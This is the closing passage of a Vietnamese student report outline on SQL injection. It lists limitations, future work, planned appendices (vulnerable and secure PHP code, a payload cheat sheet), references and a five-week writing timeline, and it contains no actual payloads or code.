- Đã demo tấn công thực tế và sử dụng công cụ tự động
- Đã trình bày và áp dụng biện pháp khắc phục

### 10.2 Hạn chế
- Ứng dụng demo đơn giản, chưa phản ánh hết tình huống thực tế
- Chưa đề cập NoSQL Injection, ORM Injection
- Chưa test trên môi trường production thực tế

### 10.3 Hướng phát triển
- Mở rộng sang các loại Injection khác (LDAP, XPath, NoSQL)
- Tích hợp WAF và đánh giá hiệu quả
- Xây dựng tool tự động phát hiện SQLi bằng machine learning
- Phát triển ứng dụng thành nền tảng training security (giống DVWA)

---

## PHỤ LỤC

### Phụ lục A: Hướng dẫn cài đặt môi trường
- Cài đặt XAMPP / Docker
- Import database
- Cấu hình ứng dụng

### Phụ lục B: Source code đầy đủ
- Code các file PHP (vulnerable + secure version)
- Database SQL script

### Phụ lục C: Bảng tổng hợp Payload
- Cheat sheet SQL Injection cho MySQL, MSSQL, Oracle

### Phụ lục D: Tài liệu tham khảo
1. EC-Council. CEH v12 - Module 15: SQL Injection
2. OWASP. SQL Injection Prevention Cheat Sheet
3. OWASP. Testing for SQL Injection
4. PortSwigger. SQL Injection - Web Security Academy
5. sqlmap Documentation
6. Justin Clarke. "SQL Injection Attacks and Defense" - 2nd Edition

---

## 📊 TIMELINE GỢI Ý

| Tuần | Công việc | Output |
|------|----------|--------|
| 1 | Viết Chương 1, 2, 3 (Lý thuyết) | 20-25 trang |
| 2 | Build ứng dụng VulnShop (Chương 4) | Source code + database |
| 3 | Thực hành tấn công + viết Chương 5, 6 | Screenshot + 15-20 trang |
| 4 | Fix lỗ hổng + viết Chương 7, 8 | Code secure + 13-17 trang |
| 5 | Viết Chương 9, 10 + Phụ lục + Review | Báo cáo hoàn chỉnh |

---

> ⚠️ **Lưu ý:** File này là kế hoạch và dàn bài chi tiết. 
> Các đoạn code là code mẫu minh họa, cần được phát triển thành ứng dụng hoàn chỉnh.
